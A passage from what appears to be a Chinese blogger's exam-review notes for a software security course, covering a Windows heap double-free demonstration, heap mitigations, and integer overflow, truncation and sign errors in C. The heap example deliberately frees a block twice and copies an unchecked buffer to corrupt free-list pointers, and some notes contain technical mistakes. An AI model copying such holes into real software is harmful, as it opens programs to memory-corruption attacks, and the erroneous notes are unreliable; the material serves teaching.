class="number">16</span>);</span><br><span class="line"><span class="built_in">memset</span>(h2, <span class="string">&#x27;b&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">32</span>);</span><br><span class="line"><span class="built_in">memset</span>(h3, <span class="string">&#x27;c&#x27;</span>, <span class="number">32</span>);</span><br><span class="line">h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line"><span class="built_in">memset</span>(h4, <span class="string">&#x27;d&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY,<span class="number">8</span>) <span class="comment">// 内存分配块5</span></span><br><span class="line"><span class="built_in">memset</span>(h5, <span class="string">&#x27;e&#x27;</span>, <span class="number">8</span>);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h2); <span class="comment">// 释放h2</span></span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h3); <span class="comment">// 释放h3</span></span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h3);</span><br><span class="line">h6 = HeapAlloc(hp, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="built_in">memset</span>(h6, <span class="string">&#x27;f&#x27;</span>, <span class="number">64</span>);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span> *)h4, buffer);</span><br><span class="line">h7 = HeapAlloc(hp, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Never gets here.\n”);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>释放h2之后：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/6563dcd8-fc2d-457a-b7a2-cd2bf8c8cfd7.png" alt="image.png"></p>
<ul>
<li>FreeList[0]在<strong>0x00BA0708</strong>处包含有一个空闲块。</li>
<li>FreeList[<strong>3</strong>]包含有另一个空闲块，这个空闲块就是<strong>h2</strong>。h1由“aaa…a”填充等。</li>
</ul>
<p>释放h3之后：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/e8069967-60fc-4a44-85d6-a5abba983cd8.png" alt="image.png"></p>
<ul>
<li>此时h2和h3合并，在FreeList[<strong>8</strong>]新的空闲块h3的用户区域的起始8个字节并不包含指针，但h2中的指针已经被更新。h2中的指针被更新为指向FreeList[<strong>8</strong>]。</li>
</ul>
<p>第二次释放h3之后：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/beeff8c3-07ff-433b-ab2c-8fb4fe720e34.png" alt="image.png"></p>
<ul>
<li>h3释放第二次之后：空闲块完全消失了，FreeList[0]指向<strong>0x00BA06A0</strong>: <strong>一个2KB大小的空闲块</strong>。</li>
<li>已分配的h4 and h5正好位于这块虚假的未分配的区域。利用：覆写指向FreeList[0]的前向和后向指针。位于0x00BA06A0，当前不可访问。</li>
<li>漏洞利用<strong>代码分配另外的64字节空间</strong>，将8字节的头部以及前向和后向指针数据<strong>写入0x00ba06e0，也就是h4所指向的内存块，</strong>能被覆写。</li>
</ul>
<h3 id="缓解策略"><a href="#缓解策略" class="headerlink" title="缓解策略"></a>缓解策略</h3><p>1.PhkMalloc</p>
<p>（1）被设计成可以<strong>在一个虚拟内存系统中高效运作</strong>，这样就能执行更强的检查，在不解引用指针的前提下<strong>判定传递给free()或realloc()的指针</strong>是否有效。</p>
<p>（2）<strong>不能检测是否传递了一个错误</strong>（但有效）的指针，但它可以<strong>检测所有</strong>不是由malloc()或realloc()返回的值。</p>
<p>（3）检测一个指针是已分配的还是空闲的，因此它可以<strong>检测所有的双重释放错误。</strong>对于未授权进程而言，这些错误都被当作警告看待。启用“A”或“abort”选项则会导致这些警告被当作错误看待，一个错误就表示一个终点，会导致调用abort()</p>
<p>（4）加入了<strong>“J(unk)”和“Z(ero)”</strong>选项，从而可以检测出更多的<strong>内存管理缺陷</strong>。J(unk)选项会在<strong>已分配的区域内填充Oxd0</strong>，Z(ero)选项<strong>也给分配的区域填充垃圾数据</strong>，当用户请求的精确长度为0时则不进行操作。</p>
<p>2.随机化</p>
<p>（1）malloc()调用返回的地址在很大程度上是<strong>可预测的</strong></p>
<p>（2）程序返回的内存块地址随机化，可以使对基于<strong>堆的漏洞</strong>利用变得更加困难</p>
<p>3.哨位页</p>
<p>（1）都是<strong>未映射的</strong>，被放置到<strong>已分配内存（一个页或更大）之间的空间</strong></p>
<p>（2）当攻击者在<strong>利用缓冲区溢出哨位页时</strong>，程序会引发段故障。OpenBSD, Electric Fence, Application Verifier都实现了哨位页。哨位页有着很大的开销。</p>
<p>4.著名的漏洞：<strong>缓冲区溢出漏洞、微软数据访问组件、CVS服务器双重释放漏洞、Kerberos 5中的漏洞</strong></p>
<aside>
📔

<p>总结:</p>
<p>（1）C和C++程序中的动态内存管理容易产生<strong>软件缺陷和安全缺陷</strong></p>
<p>（2）虽然<strong>基于堆的漏洞</strong>比基于栈的漏洞更难被利用，但那些有着内存相关安全缺陷的程序<strong>仍然可能遭受攻击</strong></p>
<p>（3）将良好的程序<strong>设计实践与动态分析</strong>相结合，可以帮助用户在开发过程中<strong>识别和消除</strong>这些安全缺陷</p>
</aside>

<h2 id="整数安全"><a href="#整数安全" class="headerlink" title="整数安全"></a>整数安全</h2><h3 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h3><p>1.整数安全例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> *buff = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(buff, argv[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.整数表示方法：<strong>原码、反码、补码。</strong>对整数表示法而言，需要考虑的问题主要就是<strong>负数的表示。</strong></p>
<p>（1）原码值的表示方法</p>
<p>利用最高位表示数值的符号：0正、1负。余下的所有低位表示值的大小。如果最高位未置位，表示+41，如果最高位被置位，则表示-41。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2068.png" alt="image.png"></p>
<p>（2）反码表示法</p>
<p>由于实现原码表示法所需的电路过于复杂，因此人们后来采用反码表示法取而代之。将一个整数值的每一位取反，就得到于其对应的负数。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2069.png" alt="image.png"></p>
<p>练习：整数10101001用反码表示为<strong>01010110</strong></p>
<p>（3）补码表示法</p>
<p>补码表示法的负数是在反码表示法的结果末位加1而得。补码表示法对0只有+0一种表示。<strong>最高位仍然是符号位</strong>。正数的补码表示法则与原码表示法相同。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2070.png" alt="image.png"></p>
<p>练习：整数00101000用补码表示为<strong>00101000</strong></p>
<p>3.带符号和无符号类型</p>
<p>（1）C和C++中的整数分为<strong>带符号和无符号</strong>两种，每一种带符号类型都有<strong>对应的无符号类型。</strong></p>
<p>（2）带符号整数：带符号整型<strong>用来表示正值和负值。</strong>在一个使用<strong>补码</strong>表示法的计算机上，带符号整数的取值范围是**$(-2^{n-1})$~$(2^{n-1})-1$<strong>。反码和原码最小值：</strong>$(-2^{n-1})+1$**</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2071.png" alt="image.png"></p>
<p>（3）无符号整数：取值范围是0~<strong>$2^n-1$<strong>。</strong>任一种带符号整型都有对应的无符号整型。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2072.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2073.png" alt="image.png"></p>
<p>4.整数取值范围：一个整数类型的最大值和最小值取决于<strong>该类型的表示法、是否带符号、分配的内存位数大小。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2074.png" alt="image.png"></p>
<h3 id="整数的转换"><a href="#整数的转换" class="headerlink" title="整数的转换"></a>整数的转换</h3><p>1.整型转换</p>
<p>（1）在C和C++中，类型转换<strong>既可能作为转型操作的结果显式发生</strong>，也可能<strong>因为某个操作的需要而隐式发生</strong>。</p>
<p>（2）整型转换可能会导致<strong>数据丢失或错误的表示</strong>。隐式转换是C语言可以<strong>对混合数据类型执行操作能力的结果。</strong></p>
<p>（3）<strong>整型提升、整型转换级别、普通算术转换。</strong></p>
<p>2.整型提升</p>
<p>（1）在比<strong>int小的整型</strong>进行操作（算术运算、函数参数、函数返回值）时，它们会被提升。</p>
<p>（2）如果原始类型的所有值都可以用int表示，<strong>较小的类型会被转换成－个int，否则被转换成－个unsigned int。</strong></p>
<p>（3）整型提升被作为普通算术转换的一个组成部分：<strong>某些自变量表达式、一元的+-和~操作符、移位操作</strong></p>
<p>（4）例子：由于整型提升，因此这里c1和c2都要被提升到int类型的大小：<strong>char c1, c2; c1 &#x3D; c1 + c2;</strong> 然后<strong>两个int类型的数据相加，求和结果被截断</strong>以适应char类型的大小。整型提升主要是为了<strong>防止运算过程中中间结果发生溢出而导致算术错误。</strong></p>
<p>3.隐式转换：<strong>两个不同类型变量</strong>进行算术运算，或不同类型<strong>变量间的赋值</strong>。</p>
<p>考试题：问你输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> cresult, c1, c2, c3; </span><br><span class="line"><span class="comment">// c1、c2的和超过了signed char类型的最大值（-128~127）</span></span><br><span class="line">c1 = <span class="number">100</span>;</span><br><span class="line">c2 = <span class="number">90</span>;</span><br><span class="line">c3 = <span class="number">-120</span>;</span><br><span class="line">cresult = c1 + c2 + c3;</span><br><span class="line"><span class="comment">// c1与c2相加，该结果随后被截断，并存储在cresult中，**没有数据丢失**</span></span><br><span class="line"><span class="comment">// 然而，由于发生了整型提升，c1、c2和c3都被转换为整型，因此整个表达式的结果能够被成功地计算出来。</span></span><br></pre></td></tr></table></figure>

<p>4.整数转换级别规则</p>
<p>（1）没有任何两种不同的带符号整型<strong>具有相同的级别</strong>，即使它们的（内存）<strong>表示法相同。</strong></p>
<p><strong>（2）低精度的带符号整型的级别比高精度的带符号整型类型的级别低。</strong></p>
<p>（3）long long int类型的级别比long int高，long int的级别比int高，int的级别比short int高，<strong>short int的级别比signed char高。</strong></p>
<p><strong>（4）无符号整型的级别与对应的带符号整型的级别相同。</strong></p>
<p>本质：<strong>每一个bit都不会变化</strong>，只是表示的<strong>意义可能变得不同，比如说符号位的变化</strong>；或者，高位可能被舍弃。</p>
<p>5.从无符号整型转换</p>
<p>（1）从<strong>较小的无符号整型</strong>转换到<strong>较大的无符号整型</strong>总是<strong>安全的</strong>，通常通过对其值<strong>进行零扩展</strong>而完成</p>
<p>（2）当一个<strong>较大的无符号整型</strong>被<strong>转换到一个较小的无符号整型</strong>的时候：<strong>较大的值将会被戳断、低位数据被保留</strong></p>
<p>（3）<strong>当无符号整型转换到其对应的带符号整型</strong>的时候：<strong>位模式（即所有的位数据）将会被保留</strong>，因此没有数据会因此丢失；<strong>最高位数据变成了符号位。</strong>如果该符号位被置位，该值的符号和大小都会发生改变。</p>
<p>注意一下什么时候数据曲解</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2075.png" alt="image.png"></p>
<p>6.带符号整型转换</p>
<p>（1）当一个<strong>非负的带符号整数</strong>被转换为一个<strong>相同大小或更大的无符号整型</strong>的时候：<strong>值不会发生变化，带符号整数需作符号扩展。</strong></p>
<p>（2）当一个<strong>带符号整数</strong>被转换为一个<strong>较短的带符号整数的时候</strong>，则是通过<strong>截断高位完成的。</strong></p>
<p>（3）当<strong>带符号整数转换到无符号整数：其位模式被保留，故不会有数据的丢失。高位失去了符号位的功能。</strong></p>
<p>（4）如果<strong>带符号整型的值非负</strong>，那它的值<strong>不会发生改变。</strong></p>
<p>（5）如果其<strong>值是负数</strong>，得到的<strong>无符号结果将被求值为一个非常大的带符号整数。</strong></p>
<p>注意一下什么时候数据曲解，相同时候</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2076.png" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l = ULONG_MAX;</span><br><span class="line"><span class="type">char</span> c = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (c == l) &#123; <span class="comment">// c与1进行相等性比较</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-1 = 4,294,967,295?\n&quot;</span>); </span><br><span class="line"><span class="comment">// 由于整型提升规则发挥作用，导致c被转换成为一个无符号的整数，**其值为0xFFFFFFFF或4,294,967,295**</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>7.带符号或无符号字符</p>
<p>（1）<strong>char类型既可以是带符号的</strong>，也可以是<strong>无符号。</strong></p>
<p>（2）当一个符号位被置位的<strong>signed char</strong>类型的数据被当作整型保存时，其结果就是一个<strong>负数</strong>。</p>
<p>（3）当处理值可能会大于127(0x7F)的字符数据时，对于涉及的字符缓冲区、指针及转型，最好用unsigned char代替char或signed char。</p>
<p>8.普通算术转换</p>
<p>（1）如果两个操作数<strong>具有同样的类型</strong>，则不需要进一步的转换。</p>
<p>（2）如果两个操作数<strong>拥有同样的整型</strong>（带符号或无符号），具有<strong>较低整数转换级别的类型的操作数</strong>会被转换到<strong>拥有较高级别的操作数的类型。</strong></p>
<p>（3）如果具有无符号整型操作数的级别<strong>大于或等于另一个操作数类型的级别</strong>，则带符号整型操作数将<strong>被转换为无符号整型操作数的类型。</strong></p>
<p>（4）如果带符号整型操作数类型能够表示无符号整型操作数类型的所有可能值，则<strong>无符号整型操作数将被转换为带符号整型操作数的类型。</strong>否则，<strong>两个操作数都被转换为与带符号整型操作数类型相对应的无符号整型。</strong></p>
<h4 id="整数错误情形"><a href="#整数错误情形" class="headerlink" title="整数错误情形"></a><strong>整数错误情形</strong></h4><p><strong>整型操作溢出、符号错误、截断错误</strong>会导致非预期的结果。</p>
<p>9.整数溢出：int_max++会变成int_min</p>
<p>（1）当一个整数被增加<strong>超过其最大值</strong>或被减小<strong>小于其最小值</strong>时即会发生整数溢出</p>
<p>（2）<strong>带符号和无符号的数</strong>都有可能发生溢出：<strong>带符号溢出发生于对符号位执行进位时；无符号溢出则发生于当底层表示不再能够表示－个值时。</strong></p>
<p>有相似的练习题，问输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">i = INT_MAX; <span class="comment">// 2,147,483,647</span></span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i); <span class="comment">// i = -2,147,483,648</span></span><br><span class="line"></span><br><span class="line">j = UINT_MAX; <span class="comment">// 4,294,967,295;</span></span><br><span class="line">j++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;j = %u\n&quot;</span>, j); <span class="comment">// j = 0</span></span><br><span class="line"></span><br><span class="line">i = INT_MIN; <span class="comment">// -2,147,483,648;</span></span><br><span class="line">i--; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i); <span class="comment">// i = 2,147,483,647</span></span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">j--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;j = %u\n&quot;</span>, j); <span class="comment">// j = 4,294,967,295</span></span><br></pre></td></tr></table></figure>

<p>10.截断错误：大整型到小整型，<strong>高位丢失</strong>，只保留低位。</p>
<p>（1）截断错误发生于<strong>将一个较大整型的数转换到较小的整型</strong>，该数的<strong>原值超出较小类型的表示范围。</strong></p>
<p>（2）原值的<strong>低位被保留下来而高位则被丢弃。</strong></p>
<p>考试练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> cresult, c1, c2, c3;</span><br><span class="line">c1 = <span class="number">100</span>;</span><br><span class="line">c2 = <span class="number">90</span>;</span><br><span class="line">cresult1 = c1 + c2;</span><br><span class="line">cresult2 = c1 + c2 + c3;</span><br></pre></td></tr></table></figure>

<ul>
<li>c1加c2超过了signed char(+127)的最大值。当该值赋给一个太小的数据类型的时候，而无法表示结果值的时候。<strong>会发生截断错误。（即cresult1发生整数截断）</strong>在操作前，把比int小的整型提升为int或unsigned int。</li>
<li><strong>cresult2不会</strong>。</li>
</ul>
<p>11.符号错误：即<strong>无符号数和有符号数</strong>之间的转换，由于高位的<strong>标志位代表意义不同</strong>导致的。   </p>
<p>（1）从无符号整型转换到带符号整型。</p>
<p><strong>①相同大小：位模式保留不变，最高位变成符号位。</strong></p>
<p><strong>②更大：进行符号扩展，</strong>然后才执行转换。</p>
<p><strong>③更小：保留低位。</strong></p>
<p>（2）如果无符号整数的<strong>最高位：没被设置，值不变；被设置，变成负值。</strong></p>
<p>（3）带符号整型转换到无符号整型。</p>
<p><strong>①相同大小：位模式保留不变，最高位变成符号位。</strong></p>
<p><strong>②更大：进行符号扩展，</strong>然后才执行转换。</p>
<p><strong>③更小：保留低位。</strong></p>
<p>（4）如果带符号整数的值：<strong>是非负的，值不变；负的，结果通常是一个很大的正值。</strong></p>
<p>考试练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">-3</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> u;</span><br><span class="line">u = i; <span class="comment">// 隐式转换为**较小的无符号整数**</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;u = %hu\n&quot;</span>, u);</span><br></pre></td></tr></table></figure>

<ul>
<li>有足够的位来表示值，所以<strong>没有发生截断</strong>。但是补码表示法被解释为一个大的符号值，<strong>所以输出的u&#x3D;65533，FFFD。</strong></li>
</ul>
<h3 id="整数的操作"><a href="#整数的操作" class="headerlink" title="整数的操作"></a>整数的操作</h3><p>整数操作会导致错误和非预期的值。非预期的整数值可能会导致<strong>非预期的程序行为、安全漏洞。</strong>大部分整数操作会导致<strong>异常条件。</strong></p>
<p>1.整数的重要使用场景：<strong>作为数组索引、在任何指针的算术运算中、作为一个对象的长度或大小、作为一个数组边界（例如一个循环计数器）、作为内存分配函数的参数、在对安全要求很关键的代码中。</strong></p>
<p>2.异常情况</p>
<p>（1）不包含算术转换产生的错误</p>
<p>（2）整数错误能够被侦测，有符号溢出和无符号回绕都被描述为适当的先验条件测试和后验条件测试。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2077.png" alt="image.png"></p>
<p>3.整数加法</p>
<p>（1）加法用来将<strong>两个算术操作数或者一个整数与一个指针相加</strong>。如果两个操作数都是算术类型，那么将会对它们执行普通算术转换。如果结果整型占用的位数不足以表示其结果，那么就会导致溢出。</p>
<p>（2）IA-32加法指令：add destination,source。将第一操作数（目的）与第二操作数相加，并<strong>将结果存放到目的操作数</strong>。目的操作数可以是一个<strong>寄存器或者内存位置</strong>。源操作数可以是一个<strong>立即数、寄存器或者内存位置</strong>。侦测和报告<strong>带符号和无符号的整数溢出条件</strong>。</p>
<p>（3）add ax,bx：将16位寄存器bx和16位寄存器ax相加，并将结果存储到寄存器ax中。</p>
<p>（4）加法指令在<strong>标志寄存器</strong>中设置标志：一个用于指示带符号算术溢出的溢出标志、一个用于指示无符号算术溢出的进位标志。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2078.png" alt="image.png"></p>
<p>（5）解释标志：在机器水平上带符号和无符号的整数是没有区别的。整数溢出和进位标志必须要根据实际情况来解。</p>
<p>（6）加法：带符号&#x2F;无符号的char</p>
<p>①当把两个<strong>signed char</strong>相加的时候，它们的值会发生符号扩展。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc1 + sc2</span><br><span class="line">movsx eax, byte ptr [sc1] </span><br><span class="line">movsx ecx, byte ptr [sc2] </span><br><span class="line">add eax, ecx</span><br></pre></td></tr></table></figure>

<p>②当把两个<strong>unsigned char</strong>相加的时候，它们的值会发生零扩展来避免改变大小。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uc1 + uc2</span><br><span class="line">movzx eax, byte ptr [uc1] </span><br><span class="line">movzx ecx, byte ptr [uc2] </span><br><span class="line">add eax, ecx</span><br></pre></td></tr></table></figure>

<p>（7）加法：带符号&#x2F;无符号的int</p>
<p>把两个<strong>unsigned int</strong>相加，为<strong>signed int</strong>的值生成相同的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ui1 + ui2</span><br><span class="line">mov eax, dword ptr [ui1] </span><br><span class="line">add eax, dword ptr [ui2]</span><br></pre></td></tr></table></figure>

<p>（8）加法：带符号的long long int</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sll1 + sll2</span><br><span class="line">mov eax, dword ptr [sll1] </span><br><span class="line">add eax, dword ptr [sll2] # 加法指令使得低<span class="number">32</span> bits相加</span><br><span class="line">mov ecx, dword ptr [ebp<span class="number">-98</span>h] </span><br><span class="line">adc ecx, dword ptr [ebp<span class="number">-0</span>A8h] <span class="meta"># adc指令把高位上的32位和进位标志位的值相加</span></span><br></pre></td></tr></table></figure>

<p>（9）无符号整数溢出检测</p>
<p>①进位标志意味着无符号算术溢出</p>
<p>②无符号整数溢出通过使用下列方法检测：<strong>jc指令(如果有进位标志，则转跳)、jnc指令(如果没有进位标志，则转跳)</strong></p>
<p>③这些跳转指令放在下列条件后：做32位运算时，放在指令add之后；做64位运算时，则放在adc之后。</p>
<p>（10）带符号整数溢出检测</p>
<p><strong>①进位标志意味着带符号算术溢出</strong></p>
<p>②带符号整数溢出通过使用下列方法检测：<strong>jo指令(如果有溢出，则转跳)、jno指令(如果没有溢出，则转跳)</strong></p>
<p>③这些跳转指令放在下列条件后：做32位运算肘，放在指令add之后；做64位运算肘，则放在adc之后。</p>
<p>（11）先验条件</p>
<p><strong>①先检查可能会否溢出！带符号整数的相加可能会导致整数溢出，如果加法操作的左操作数(LHS)和右操作数(RHS)的和大于UINT_MAX（对于int相加而言）或大于UL LONG_MAX（对于unsigned long long相加而言）的话。</strong></p>
<p>②先验条件例子</p>
<p>当A和B是无符号的，并且满足下列条件时，会发生整数溢出：<strong>A + B &gt; UINT_MAX</strong></p>
<p>整数溢出防范检测代码：<strong>A &gt; UINT_MAX – B</strong></p>
<p>当A和B是long long int，并且满足下列条件时，会发生整数溢出：<strong>A + B &gt; ULLONG_MAX</strong></p>
<p>（12）Int类型的带符号整数相加（练习题有一道选择题）</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2079.png" alt="image.png"></p>
<p>（13）后验条件：先执行加法，然后对结果进行评估。</p>
<p>例如: 令<strong>sum &#x3D; lhs + rhs。</strong>如果<strong>lhs</strong>非负且<strong>sum &lt; rhs**，表明发生了溢出；如果**lhs**为负且**sum &gt; rhs，</strong>表明发生了溢出。所有其他的情况则表明加注操作成功完成而无溢出。对于无符号整数来说，如果sum比任意一个操作数小，就表明发生了溢出。</p>
<p>4.整数减法</p>
